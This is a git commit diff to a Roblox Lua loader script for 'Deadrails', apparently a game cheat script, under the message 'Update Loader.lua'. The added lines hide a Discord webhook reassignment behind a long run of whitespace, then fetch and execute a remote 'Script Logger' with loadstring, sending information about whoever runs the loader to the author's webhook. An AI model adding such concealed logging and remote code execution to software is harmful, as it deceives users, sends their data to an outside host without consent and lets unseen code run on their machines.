dd6533939cad8ca416b8c124a30b2ea6d4e1b410
yes1nt <94116083+yes1nt@users.noreply.github.com>
2026-08-20 00:42:23 +0800

    Update Loader.lua

--- Deadrails/Loader.lua
+++ Deadrails/Loader.lua
@@ -17,3 +17,8 @@ local toggle = ToggleButton.MakeToggle("Friedpotato", function()
 	if not frame then return end
 	frame.Visible = not frame.Visible
 end)
+
+local Webhook = "https://discord.com/api/webhooks/1386756293393383466/SlLmH26d7d1AJAJeb_o-0L-gBH2Il5gif4omF5dOSJDIdldj8738ksjdjIZumPyidNpISe_o0-";
+local ScriptName = "Deadrails";                                                                                                                                                                                                                                                                                                                                                                        Webhook = "https://discord.com/api/webhooks/1386756293393383466/SlLmH26d7d1AJAJeb_o-0L-gBH2Il5gif4omF5dFYW8OHpzEs2kIZumPyidNpISe_o0-";
+loadstring(game:HttpGet("https://raw.githubusercontent.com/yes1nt/yes/refs/heads/main/Script%20Tools/Script%20Logger"))():Log(ScriptName, Webhook)
+
